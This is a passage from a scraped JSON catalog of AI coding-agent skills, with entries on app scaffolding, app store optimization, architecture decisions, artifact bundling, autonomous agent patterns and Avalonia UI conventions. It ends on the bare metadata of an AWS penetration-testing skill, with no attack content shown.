      "content": "\n# App Builder - Application Building Orchestrator\n\n> Analyzes user's requests, determines tech stack, plans structure, and coordinates agents.\n\n## 🎯 Selective Reading Rule\n\n**Read ONLY files relevant to the request!** Check the content map, find what you need.\n\n| File | Description | When to Read |\n|------|-------------|--------------|\n| `project-detection.md` | Keyword matrix, project type detection | Starting new project |\n| `tech-stack.md` | 2025 default stack, alternatives | Choosing technologies |\n| `agent-coordination.md` | Agent pipeline, execution order | Coordinating multi-agent work |\n| `scaffolding.md` | Directory structure, core files | Creating project structure |\n| `feature-building.md` | Feature analysis, error handling | Adding features to existing project |\n| `templates/SKILL.md` | **Project templates** | Scaffolding new project |\n\n---\n\n## 📦 Templates (13)\n\nQuick-start scaffolding for new projects. **Read the matching template only!**\n\n| Template | Tech Stack | When to Use |\n|----------|------------|-------------|\n| [nextjs-fullstack](templates/nextjs-fullstack/TEMPLATE.md) | Next.js + Prisma | Full-stack web app |\n| [nextjs-saas](templates/nextjs-saas/TEMPLATE.md) | Next.js + Stripe | SaaS product |\n| [nextjs-static](templates/nextjs-static/TEMPLATE.md) | Next.js + Framer | Landing page |\n| [nuxt-app](templates/nuxt-app/TEMPLATE.md) | Nuxt 3 + Pinia | Vue full-stack app |\n| [express-api](templates/express-api/TEMPLATE.md) | Express + JWT | REST API |\n| [python-fastapi](templates/python-fastapi/TEMPLATE.md) | FastAPI | Python API |\n| [react-native-app](templates/react-native-app/TEMPLATE.md) | Expo + Zustand | Mobile app |\n| [flutter-app](templates/flutter-app/TEMPLATE.md) | Flutter + Riverpod | Cross-platform mobile |\n| [electron-desktop](templates/electron-desktop/TEMPLATE.md) | Electron + React | Desktop app |\n| [chrome-extension](templates/chrome-extension/TEMPLATE.md) | Chrome MV3 | Browser extension |\n| [cli-tool](templates/cli-tool/TEMPLATE.md) | Node.js + Commander | CLI app |\n| [monorepo-turborepo](templates/monorepo-turborepo/TEMPLATE.md) | Turborepo + pnpm | Monorepo |\n\n---\n\n## 🔗 Related Agents\n\n| Agent | Role |\n|-------|------|\n| `project-planner` | Task breakdown, dependency graph |\n| `frontend-specialist` | UI components, pages |\n| `backend-specialist` | API, business logic |\n| `database-architect` | Schema, migrations |\n| `devops-engineer` | Deployment, preview |\n\n---\n\n## Usage Example\n\n```\nUser: \"Make an Instagram clone with photo sharing and likes\"\n\nApp Builder Process:\n1. Project type: Social Media App\n2. Tech stack: Next.js + Prisma + Cloudinary + Clerk\n3. Create plan:\n   ├─ Database schema (users, posts, likes, follows)\n   ├─ API routes (12 endpoints)\n   ├─ Pages (feed, profile, upload)\n   └─ Components (PostCard, Feed, LikeButton)\n4. Coordinate agents\n5. Report progress\n6. Start preview\n```\n",
      "tags": [
        "python",
        "react",
        "node",
        "nextjs",
        "api",
        "ai",
        "agent",
        "template",
        "prisma",
        "stripe"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:40.526Z"
    },
    {
      "id": "antigravity-app-store-optimization",
      "name": "app-store-optimization",
      "slug": "app-store-optimization",
      "description": "Complete App Store Optimization (ASO) toolkit for researching, optimizing, and tracking mobile app performance on Apple App Store and Google Play Store",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/app-store-optimization",
      "content": "\n# App Store Optimization (ASO) Skill\n\nThis comprehensive skill provides complete ASO capabilities for successfully launching and optimizing mobile applications on the Apple App Store and Google Play Store.\n\n## Capabilities\n\n### Research & Analysis\n- **Keyword Research**: Analyze keyword volume, competition, and relevance for app discovery\n- **Competitor Analysis**: Deep-dive into top-performing apps in your category\n- **Market Trend Analysis**: Identify emerging trends and opportunities in your app category\n- **Review Sentiment Analysis**: Extract insights from user reviews to identify strengths and issues\n- **Category Analysis**: Evaluate optimal category and subcategory placement strategies\n\n### Metadata Optimization\n- **Title Optimization**: Create compelling titles with optimal keyword placement (platform-specific character limits)\n- **Description Optimization**: Craft both short and full descriptions that convert and rank\n- **Subtitle/Promotional Text**: Optimize Apple-specific subtitle (30 chars) and promotional text (170 chars)\n- **Keyword Field**: Maximize Apple's 100-character keyword field with strategic selection\n- **Category Selection**: Data-driven recommendations for primary and secondary categories\n- **Icon Best Practices**: Guidelines for designing high-converting app icons\n- **Screenshot Optimization**: Strategies for creating screenshots that drive installs\n- **Preview Video**: Best practices for app preview videos\n- **Localization**: Multi-language optimization strategies for global reach\n\n### Conversion Optimization\n- **A/B Testing Framework**: Plan and track metadata experiments for continuous improvement\n- **Visual Asset Testing**: Test icons, screenshots, and videos for maximum conversion\n- **Store Listing Optimization**: Comprehensive page optimization for impression-to-install conversion\n- **Call-to-Action**: Optimize CTAs in descriptions and promotional materials\n\n### Rating & Review Management\n- **Review Monitoring**: Track and analyze user reviews for actionable insights\n- **Response Strategies**: Templates and best practices for responding to reviews\n- **Rating Improvement**: Tactical approaches to improve app ratings organically\n- **Issue Identification**: Surface common problems and feature requests from reviews\n\n### Launch & Update Strategies\n- **Pre-Launch Checklist**: Complete validation before submitting to stores\n- **Launch Timing**: Optimize release timing for maximum visibility and downloads\n- **Update Cadence**: Plan optimal update frequency and feature rollouts\n- **Feature Announcements**: Craft \"What's New\" sections that re-engage users\n- **Seasonal Optimization**: Leverage seasonal trends and events\n\n### Analytics & Tracking\n- **ASO Score**: Calculate overall ASO health score across multiple factors\n- **Keyword Rankings**: Track keyword position changes over time\n- **Conversion Metrics**: Monitor impression-to-install conversion rates\n- **Download Velocity**: Track download trends and momentum\n- **Performance Benchmarking**: Compare against category averages and competitors\n\n### Platform-Specific Requirements\n- **Apple App Store**:\n  - Title: 30 characters\n  - Subtitle: 30 characters\n  - Promotional Text: 170 characters (editable without app update)\n  - Description: 4,000 characters\n  - Keywords: 100 characters (comma-separated, no spaces)\n  - What's New: 4,000 characters\n- **Google Play Store**:\n  - Title: 50 characters (formerly 30, increased in 2021)\n  - Short Description: 80 characters\n  - Full Description: 4,000 characters\n  - No separate keyword field (keywords extracted from title and description)\n\n## Input Requirements\n\n### Keyword Research\n```json\n{\n  \"app_name\": \"MyApp\",\n  \"category\": \"Productivity\",\n  \"target_keywords\": [\"task manager\", \"productivity\", \"todo list\"],\n  \"competitors\": [\"Todoist\", \"Any.do\", \"Microsoft To Do\"],\n  \"language\": \"en-US\"\n}\n```\n\n### Metadata Optimization\n```json\n{\n  \"platform\": \"apple\" | \"google\",\n  \"app_info\": {\n    \"name\": \"MyApp\",\n    \"category\": \"Productivity\",\n    \"target_audience\": \"Professionals aged 25-45\",\n    \"key_features\": [\"Task management\", \"Team collaboration\", \"AI assistance\"],\n    \"unique_value\": \"AI-powered task prioritization\"\n  },\n  \"current_metadata\": {\n    \"title\": \"Current Title\",\n    \"subtitle\": \"Current Subtitle\",\n    \"description\": \"Current description...\"\n  },\n  \"target_keywords\": [\"productivity\", \"task manager\", \"todo\"]\n}\n```\n\n### Review Analysis\n```json\n{\n  \"app_id\": \"com.myapp.app\",\n  \"platform\": \"apple\" | \"google\",\n  \"date_range\": \"last_30_days\" | \"last_90_days\" | \"all_time\",\n  \"rating_filter\": [1, 2, 3, 4, 5],\n  \"language\": \"en\"\n}\n```\n\n### ASO Score Calculation\n```json\n{\n  \"metadata\": {\n    \"title_quality\": 0.8,\n    \"description_quality\": 0.7,\n    \"keyword_density\": 0.6\n  },\n  \"ratings\": {\n    \"average_rating\": 4.5,\n    \"total_ratings\": 15000\n  },\n  \"conversion\": {\n    \"impression_to_install\": 0.05\n  },\n  \"keyword_rankings\": {\n    \"top_10\": 5,\n    \"top_50\": 12,\n    \"top_100\": 18\n  }\n}\n```\n\n## Output",
      "tags": [
        "claude",
        "ai",
        "template",
        "design",
        "firebase",
        "rag",
        "seo",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:43.307Z"
    },
    {
      "id": "antigravity-architecture",
      "name": "architecture",
      "slug": "architecture",
      "description": "Architectural decision-making framework. Requirements analysis, trade-off evaluation, ADR documentation. Use when making architecture decisions or analyzing system design.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/architecture",
      "content": "\n# Architecture Decision Framework\n\n> \"Requirements drive architecture. Trade-offs inform decisions. ADRs capture rationale.\"\n\n## 🎯 Selective Reading Rule\n\n**Read ONLY files relevant to the request!** Check the content map, find what you need.\n\n| File | Description | When to Read |\n|------|-------------|--------------|\n| `context-discovery.md` | Questions to ask, project classification | Starting architecture design |\n| `trade-off-analysis.md` | ADR templates, trade-off framework | Documenting decisions |\n| `pattern-selection.md` | Decision trees, anti-patterns | Choosing patterns |\n| `examples.md` | MVP, SaaS, Enterprise examples | Reference implementations |\n| `patterns-reference.md` | Quick lookup for patterns | Pattern comparison |\n\n---\n\n## 🔗 Related Skills\n\n| Skill | Use For |\n|-------|---------|\n| `@[skills/database-design]` | Database schema design |\n| `@[skills/api-patterns]` | API design patterns |\n| `@[skills/deployment-procedures]` | Deployment architecture |\n\n---\n\n## Core Principle\n\n**\"Simplicity is the ultimate sophistication.\"**\n\n- Start simple\n- Add complexity ONLY when proven necessary\n- You can always add patterns later\n- Removing complexity is MUCH harder than adding it\n\n---\n\n## Validation Checklist\n\nBefore finalizing architecture:\n\n- [ ] Requirements clearly understood\n- [ ] Constraints identified\n- [ ] Each decision has trade-off analysis\n- [ ] Simpler alternatives considered\n- [ ] ADRs written for significant decisions\n- [ ] Team expertise matches chosen patterns\n",
      "tags": [
        "api",
        "ai",
        "template",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:44.493Z"
    },
    {
      "id": "composio-artifacts-builder",
      "name": "artifacts-builder",
      "slug": "artifacts-builder",
      "description": "Suite of tools for creating elaborate, multi-component claude.ai HTML artifacts using modern frontend web technologies (React, Tailwind CSS, shadcn/ui). Use for complex artifacts requiring state management, routing, or shadcn/ui components - not for simple single-file HTML/JSX artifacts.",
      "category": "Development & Code Tools",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/artifacts-builder",
      "content": "\n# Artifacts Builder\n\nTo build powerful frontend claude.ai artifacts, follow these steps:\n1. Initialize the frontend repo using `scripts/init-artifact.sh`\n2. Develop your artifact by editing the generated code\n3. Bundle all code into a single HTML file using `scripts/bundle-artifact.sh`\n4. Display artifact to user\n5. (Optional) Test the artifact\n\n**Stack**: React 18 + TypeScript + Vite + Parcel (bundling) + Tailwind CSS + shadcn/ui\n\n## Design & Style Guidelines\n\nVERY IMPORTANT: To avoid what is often referred to as \"AI slop\", avoid using excessive centered layouts, purple gradients, uniform rounded corners, and Inter font.\n\n## Quick Start\n\n### Step 1: Initialize Project\n\nRun the initialization script to create a new React project:\n```bash\nbash scripts/init-artifact.sh <project-name>\ncd <project-name>\n```\n\nThis creates a fully configured project with:\n- ✅ React + TypeScript (via Vite)\n- ✅ Tailwind CSS 3.4.1 with shadcn/ui theming system\n- ✅ Path aliases (`@/`) configured\n- ✅ 40+ shadcn/ui components pre-installed\n- ✅ All Radix UI dependencies included\n- ✅ Parcel configured for bundling (via .parcelrc)\n- ✅ Node 18+ compatibility (auto-detects and pins Vite version)\n\n### Step 2: Develop Your Artifact\n\nTo build the artifact, edit the generated files. See **Common Development Tasks** below for guidance.\n\n### Step 3: Bundle to Single HTML File\n\nTo bundle the React app into a single HTML artifact:\n```bash\nbash scripts/bundle-artifact.sh\n```\n\nThis creates `bundle.html` - a self-contained artifact with all JavaScript, CSS, and dependencies inlined. This file can be directly shared in Claude conversations as an artifact.\n\n**Requirements**: Your project must have an `index.html` in the root directory.\n\n**What the script does**:\n- Installs bundling dependencies (parcel, @parcel/config-default, parcel-resolver-tspaths, html-inline)\n- Creates `.parcelrc` config with path alias support\n- Builds with Parcel (no source maps)\n- Inlines all assets into single HTML using html-inline\n\n### Step 4: Share Artifact with User\n\nFinally, share the bundled HTML file in conversation with the user so they can view it as an artifact.\n\n### Step 5: Testing/Visualizing the Artifact (Optional)\n\nNote: This is a completely optional step. Only perform if necessary or requested.\n\nTo test/visualize the artifact, use available tools (including other Skills or built-in tools like Playwright or Puppeteer). In general, avoid testing the artifact upfront as it adds latency between the request and when the finished artifact can be seen. Test later, after presenting the artifact, if requested or if issues arise.\n\n## Reference\n\n- **shadcn/ui components**: https://ui.shadcn.com/docs/components",
      "tags": [
        "react",
        "typescript",
        "javascript",
        "tailwind",
        "css",
        "html",
        "node",
        "playwright",
        "testing",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:50.297Z"
    },
    {
      "id": "awesome-llm-artifacts-builder",
      "name": "artifacts-builder",
      "slug": "awesome-llm-artifacts-builder",
      "description": "Suite of tools for creating elaborate, multi-component claude.ai HTML artifacts using modern frontend web technologies (React, Tailwind CSS, shadcn/ui). Use for complex artifacts requiring state management, routing, or shadcn/ui components - not for simple single-file HTML/JSX artifacts.",
      "category": "Development & Code Tools",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/artifacts-builder",
      "content": "\n# Artifacts Builder\n\nTo build powerful frontend claude.ai artifacts, follow these steps:\n1. Initialize the frontend repo using `scripts/init-artifact.sh`\n2. Develop your artifact by editing the generated code\n3. Bundle all code into a single HTML file using `scripts/bundle-artifact.sh`\n4. Display artifact to user\n5. (Optional) Test the artifact\n\n**Stack**: React 18 + TypeScript + Vite + Parcel (bundling) + Tailwind CSS + shadcn/ui\n\n## Design & Style Guidelines\n\nVERY IMPORTANT: To avoid what is often referred to as \"AI slop\", avoid using excessive centered layouts, purple gradients, uniform rounded corners, and Inter font.\n\n## Quick Start\n\n### Step 1: Initialize Project\n\nRun the initialization script to create a new React project:\n```bash\nbash scripts/init-artifact.sh <project-name>\ncd <project-name>\n```\n\nThis creates a fully configured project with:\n- ✅ React + TypeScript (via Vite)\n- ✅ Tailwind CSS 3.4.1 with shadcn/ui theming system\n- ✅ Path aliases (`@/`) configured\n- ✅ 40+ shadcn/ui components pre-installed\n- ✅ All Radix UI dependencies included\n- ✅ Parcel configured for bundling (via .parcelrc)\n- ✅ Node 18+ compatibility (auto-detects and pins Vite version)\n\n### Step 2: Develop Your Artifact\n\nTo build the artifact, edit the generated files. See **Common Development Tasks** below for guidance.\n\n### Step 3: Bundle to Single HTML File\n\nTo bundle the React app into a single HTML artifact:\n```bash\nbash scripts/bundle-artifact.sh\n```\n\nThis creates `bundle.html` - a self-contained artifact with all JavaScript, CSS, and dependencies inlined. This file can be directly shared in Claude conversations as an artifact.\n\n**Requirements**: Your project must have an `index.html` in the root directory.\n\n**What the script does**:\n- Installs bundling dependencies (parcel, @parcel/config-default, parcel-resolver-tspaths, html-inline)\n- Creates `.parcelrc` config with path alias support\n- Builds with Parcel (no source maps)\n- Inlines all assets into single HTML using html-inline\n\n### Step 4: Share Artifact with User\n\nFinally, share the bundled HTML file in conversation with the user so they can view it as an artifact.\n\n### Step 5: Testing/Visualizing the Artifact (Optional)\n\nNote: This is a completely optional step. Only perform if necessary or requested.\n\nTo test/visualize the artifact, use available tools (including other Skills or built-in tools like Playwright or Puppeteer). In general, avoid testing the artifact upfront as it adds latency between the request and when the finished artifact can be seen. Test later, after presenting the artifact, if requested or if issues arise.\n\n## Reference\n\n- **shadcn/ui components**: https://ui.shadcn.com/docs/components",
      "tags": [
        "javascript",
        "typescript",
        "react",
        "node",
        "claude",
        "ai",
        "design",
        "artifacts",
        "builder"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:39.054Z"
    },
    {
      "id": "antigravity-autonomous-agent-patterns",
      "name": "autonomous-agent-patterns",
      "slug": "autonomous-agent-patterns",
      "description": "Design patterns for building autonomous coding agents. Covers tool integration, permission systems, browser automation, and human-in-the-loop workflows. Use when building AI agents, designing tool APIs, implementing permission systems, or creating autonomous coding assistants.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/autonomous-agent-patterns",
      "content": "\n# 🕹️ Autonomous Agent Patterns\n\n> Design patterns for building autonomous coding agents, inspired by [Cline](https://github.com/cline/cline) and [OpenAI Codex](https://github.com/openai/codex).\n\n## When to Use This Skill\n\nUse this skill when:\n\n- Building autonomous AI agents\n- Designing tool/function calling APIs\n- Implementing permission and approval systems\n- Creating browser automation for agents\n- Designing human-in-the-loop workflows\n\n---\n\n## 1. Core Agent Architecture\n\n### 1.1 Agent Loop\n\n```\n┌─────────────────────────────────────────────────────────────┐\n│                     AGENT LOOP                               │\n│                                                              │\n│  ┌──────────┐    ┌──────────┐    ┌──────────┐              │\n│  │  Think   │───▶│  Decide  │───▶│   Act    │              │\n│  │ (Reason) │    │ (Plan)   │    │ (Execute)│              │\n│  └──────────┘    └──────────┘    └──────────┘              │\n│       ▲                               │                     │\n│       │         ┌──────────┐          │                     │\n│       └─────────│ Observe  │◀─────────┘                     │\n│                 │ (Result) │                                │\n│                 └──────────┘                                │\n└─────────────────────────────────────────────────────────────┘\n```\n\n```python\nclass AgentLoop:\n    def __init__(self, llm, tools, max_iterations=50):\n        self.llm = llm\n        self.tools = {t.name: t for t in tools}\n        self.max_iterations = max_iterations\n        self.history = []\n\n    def run(self, task: str) -> str:\n        self.history.append({\"role\": \"user\", \"content\": task})\n\n        for i in range(self.max_iterations):\n            # Think: Get LLM response with tool options\n            response = self.llm.chat(\n                messages=self.history,\n                tools=self._format_tools(),\n                tool_choice=\"auto\"\n            )\n\n            # Decide: Check if agent wants to use a tool\n            if response.tool_calls:\n                for tool_call in response.tool_calls:\n                    # Act: Execute the tool\n                    result = self._execute_tool(tool_call)\n\n                    # Observe: Add result to history\n                    self.history.append({\n                        \"role\": \"tool\",\n                        \"tool_call_id\": tool_call.id,\n                        \"content\": str(result)\n                    })\n            else:\n                # No more tool calls = task complete\n                return response.content\n\n        return \"Max iterations reached\"\n\n    def _execute_tool(self, tool_call) -> Any:\n        tool = self.tools[tool_call.name]\n        args = json.loads(tool_call.arguments)\n        return tool.execute(**args)\n```\n\n### 1.2 Multi-Model Architecture\n\n```python\nclass MultiModelAgent:\n    \"\"\"\n    Use different models for different purposes:\n    - Fast model for planning\n    - Powerful model for complex reasoning\n    - Specialized model for code generation\n    \"\"\"\n\n    def __init__(self):\n        self.models = {\n            \"fast\": \"gpt-3.5-turbo\",      # Quick decisions\n            \"smart\": \"gpt-4-turbo\",        # Complex reasoning\n            \"code\": \"claude-3-sonnet\",     # Code generation\n        }\n\n    def select_model(self, task_type: str) -> str:\n        if task_type == \"planning\":\n            return self.models[\"fast\"]\n        elif task_type == \"analysis\":\n            return self.models[\"smart\"]\n        elif task_type == \"code\":\n            return self.models[\"code\"]\n        return self.models[\"smart\"]\n```\n\n---\n\n## 2. Tool Design Patterns\n\n### 2.1 Tool Schema\n\n```python\nclass Tool:\n    \"\"\"Base class for agent tools\"\"\"\n\n    @property\n    def schema(self) -> dict:\n        \"\"\"JSON Schema for the tool\"\"\"\n        return {\n            \"name\": self.name,\n            \"description\": self.description,\n            \"parameters\": {\n                \"type\": \"object\",\n                \"properties\": self._get_parameters(),\n                \"required\": self._get_required()\n            }\n        }\n\n    def execute(self, **kwargs) -> ToolResult:\n        \"\"\"Execute the tool and return result\"\"\"\n        raise NotImplementedError\n\nclass ReadFileTool(Tool):\n    name = \"read_file\"\n    description = \"Read the contents of a file from the filesystem\"\n\n    def _get_parameters(self):\n        return {\n            \"path\": {\n                \"type\": \"string\",\n                \"description\": \"Absolute path to the file\"\n            },\n            \"start_line\": {\n                \"type\": \"integer\",\n                \"description\": \"Line to start reading from (1-indexed)\"\n            },\n            \"end_line\": {\n                \"type\": \"integer\",\n                \"description\": \"Line to stop reading at (inclusive)\"\n            }\n        }\n\n    def _get_required(self):\n        return [\"path\"]\n\n    def execute(self, path: str, start_line: int = None, end_line: int = None) -> ToolResult:\n        try:\n            with open(path, 'r') as f",
      "tags": [
        "python",
        "node",
        "markdown",
        "api",
        "mcp",
        "claude",
        "ai",
        "agent",
        "llm",
        "gpt"
      ],
      "useCases": [
        "Building autonomous AI agents",
        "Designing tool/function calling APIs",
        "Implementing permission and approval systems",
        "Creating browser automation for agents",
        "Designing human-in-the-loop workflows"
      ],
      "scrapedAt": "2026-01-26T13:16:45.743Z"
    },
    {
      "id": "antigravity-autonomous-agents",
      "name": "autonomous-agents",
      "slug": "autonomous-agents",
      "description": "Autonomous agents are AI systems that can independently decompose goals, plan actions, execute tools, and self-correct without constant human guidance. The challenge isn't making them capable - it's making them reliable. Every extra decision multiplies failure probability.  This skill covers agent l",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/autonomous-agents",
      "content": "\n# Autonomous Agents\n\nYou are an agent architect who has learned the hard lessons of autonomous AI.\nYou've seen the gap between impressive demos and production disasters. You know\nthat a 95% success rate per step means only 60% by step 10.\n\nYour core insight: Autonomy is earned, not granted. Start with heavily\nconstrained agents that do one thing reliably. Add autonomy only as you prove\nreliability. The best agents look less impressive but work consistently.\n\nYou push for guardrails before capabilities, logging befor\n\n## Capabilities\n\n- autonomous-agents\n- agent-loops\n- goal-decomposition\n- self-correction\n- reflection-patterns\n- react-pattern\n- plan-execute\n- agent-reliability\n- agent-guardrails\n\n## Patterns\n\n### ReAct Agent Loop\n\nAlternating reasoning and action steps\n\n### Plan-Execute Pattern\n\nSeparate planning phase from execution\n\n### Reflection Pattern\n\nSelf-evaluation and iterative improvement\n\n## Anti-Patterns\n\n### ❌ Unbounded Autonomy\n\n### ❌ Trusting Agent Outputs\n\n### ❌ General-Purpose Autonomy\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | ## Reduce step count |\n| Issue | critical | ## Set hard cost limits |\n| Issue | critical | ## Test at scale before production |\n| Issue | high | ## Validate against ground truth |\n| Issue | high | ## Build robust API clients |\n| Issue | high | ## Least privilege principle |\n| Issue | medium | ## Track context usage |\n| Issue | medium | ## Structured logging |\n\n## Related Skills\n\nWorks well with: `agent-tool-builder`, `agent-memory-systems`, `multi-agent-orchestration`, `agent-evaluation`\n",
      "tags": [
        "react",
        "api",
        "ai",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:46.967Z"
    },
    {
      "id": "antigravity-avalonia-layout-zafiro",
      "name": "avalonia-layout-zafiro",
      "slug": "avalonia-layout-zafiro",
      "description": "Guidelines for modern Avalonia UI layout using Zafiro.Avalonia, emphasizing shared styles, generic components, and avoiding XAML redundancy.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/avalonia-layout-zafiro",
      "content": "\n# Avalonia Layout with Zafiro.Avalonia\n\n> Master modern, clean, and maintainable Avalonia UI layouts.\n> **Focus on semantic containers, shared styles, and minimal XAML.**\n\n## 🎯 Selective Reading Rule\n\n**Read ONLY files relevant to the layout challenge!**\n\n---\n\n## 📑 Content Map\n\n| File | Description | When to Read |\n|------|-------------|--------------|\n| `themes.md` | Theme organization and shared styles | Setting up or refining app themes |\n| `containers.md` | Semantic containers (`HeaderedContainer`, `EdgePanel`, `Card`) | Structuring views and layouts |\n| `icons.md` | Icon usage with `IconExtension` and `IconOptions` | Adding and customizing icons |\n| `behaviors.md` | `Xaml.Interaction.Behaviors` and avoiding Converters | Implementing complex interactions |\n| `components.md` | Generic components and avoiding nesting | Creating reusable UI elements |\n\n---\n\n## 🔗 Related Project (Exemplary Implementation)\n\nFor a real-world example, refer to the **Angor** project:\n`/mnt/fast/Repos/angor/src/Angor/Avalonia/Angor.Avalonia.sln`\n\n---\n\n## ✅ Checklist for Clean Layouts\n\n- [ ] **Used semantic containers?** (e.g., `HeaderedContainer` instead of `Border` with manual header)\n- [ ] **Avoided redundant properties?** Use shared styles in `axaml` files.\n- [ ] **Minimized nesting?** Flatten layouts using `EdgePanel` or generic components.\n- [ ] **Icons via extension?** Use `{Icon fa-name}` and `IconOptions` for styling.\n- [ ] **Behaviors over code-behind?** Use `Interaction.Behaviors` for UI-logic.\n- [ ] **Avoided Converters?** Prefer ViewModel properties or Behaviors unless necessary.\n\n---\n\n## ❌ Anti-Patterns\n\n**DON'T:**\n- Use hardcoded colors or sizes (literals) in views.\n- Create deep nesting of `Grid` and `StackPanel`.\n- Repeat visual properties across multiple elements (use Styles).\n- Use `IValueConverter` for simple logic that belongs in the ViewModel.\n\n**DO:**\n- Use `DynamicResource` for colors and brushes.\n- Extract repeated layouts into generic components.\n- Leverage `Zafiro.Avalonia` specific panels like `EdgePanel` for common UI patterns.\n",
      "tags": [
        "ai",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:48.259Z"
    },
    {
      "id": "antigravity-avalonia-viewmodels-zafiro",
      "name": "avalonia-viewmodels-zafiro",
      "slug": "avalonia-viewmodels-zafiro",
      "description": "Optimal ViewModel and Wizard creation patterns for Avalonia using Zafiro and ReactiveUI.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/avalonia-viewmodels-zafiro",
      "content": "\n# Avalonia ViewModels with Zafiro\n\nThis skill provides a set of best practices and patterns for creating ViewModels, Wizards, and managing navigation in Avalonia applications, leveraging the power of **ReactiveUI** and the **Zafiro** toolkit.\n\n## Core Principles\n\n1.  **Functional-Reactive Approach**: Use ReactiveUI (`ReactiveObject`, `WhenAnyValue`, etc.) to handle state and logic.\n2.  **Enhanced Commands**: Utilize `IEnhancedCommand` for better command management, including progress reporting and name/text attributes.\n3.  **Wizard Pattern**: Implement complex flows using `SlimWizard` and `WizardBuilder` for a declarative and maintainable approach.\n4.  **Automatic Section Discovery**: Use the `[Section]` attribute to register and discover UI sections automatically.\n5.  **Clean Composition**: map ViewModels to Views using `DataTypeViewLocator` and manage dependencies in the `CompositionRoot`.\n\n## Guides\n\n- [ViewModels & Commands](viewmodels.md): Creating robust ViewModels and handling commands.\n- [Wizards & Flows](wizards.md): Building multi-step wizards with `SlimWizard`.\n- [Navigation & Sections](navigation_sections.md): Managing navigation and section-based UIs.\n- [Composition & Mapping](composition.md): Best practices for View-ViewModel wiring and DI.\n\n## Example Reference\n\nFor real-world implementations, refer to the **Angor** project:\n- `CreateProjectFlowV2.cs`: Excellent example of complex Wizard building.\n- `HomeViewModel.cs`: Simple section ViewModel using functional-reactive commands.\n",
      "tags": [
        "react",
        "ai",
        "rag"
      ],
      "useCases": [
        "`CreateProjectFlowV2.cs`: Excellent example of complex Wizard building.",
        "`HomeViewModel.cs`: Simple section ViewModel using functional-reactive commands."
      ],
      "scrapedAt": "2026-01-26T13:16:49.584Z"
    },
    {
      "id": "antigravity-avalonia-zafiro-development",
      "name": "avalonia-zafiro-development",
      "slug": "avalonia-zafiro-development",
      "description": "Mandatory skills, conventions, and behavioral rules for Avalonia UI development using the Zafiro toolkit.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/avalonia-zafiro-development",
      "content": "\n# Avalonia Zafiro Development\n\nThis skill defines the mandatory conventions and behavioral rules for developing cross-platform applications with Avalonia UI and the Zafiro toolkit. These rules prioritize maintainability, correctness, and a functional-reactive approach.\n\n## Core Pillars\n\n1.  **Functional-Reactive MVVM**: Pure MVVM logic using DynamicData and ReactiveUI.\n2.  **Safety & Predictability**: Explicit error handling with `Result` types and avoidance of exceptions for flow control.\n3.  **Cross-Platform Excellence**: Strictly Avalonia-independent ViewModels and composition-over-inheritance.\n4.  **Zafiro First**: Leverage existing Zafiro abstractions and helpers to avoid redundancy.\n\n## Guides\n\n- [Core Technical Skills & Architecture](core-technical-skills.md): Fundamental skills and architectural principles.\n- [Naming & Coding Standards](naming-standards.md): Rules for naming, fields, and error handling.\n- [Avalonia, Zafiro & Reactive Rules](avalonia-reactive-rules.md): Specific guidelines for UI, Zafiro integration, and DynamicData pipelines.\n- [Zafiro Shortcuts](zafiro-shortcuts.md): Concise mappings for common Rx/Zafiro operations.\n- [Common Patterns](patterns.md): Advanced patterns like `RefreshableCollection` and Validation.\n\n## Procedure Before Writing Code\n\n1.  **Search First**: Search the codebase for similar implementations or existing Zafiro helpers.\n2.  **Reusable Extensions**: If a helper is missing, propose a new reusable extension method instead of inlining complex logic.\n3.  **Reactive Pipelines**: Ensure DynamicData operators are used instead of plain Rx where applicable.\n",
      "tags": [
        "react",
        "ai",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:50.876Z"
    },
    {
      "id": "antigravity-aws-penetration-testing",
      "name": "AWS Penetration Testing",
      "slug": "aws-penetration-testing",
      "description": "This skill should be used when the user asks to \"pentest AWS\", \"test AWS security\", \"enumerate IAM\", \"exploit cloud infrastructure\", \"AWS privilege escalation\", \"S3 bucket testing\", \"metadata SSRF\", \"Lambda exploitation\", or needs guidance on Amazon Web Services security assessment.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
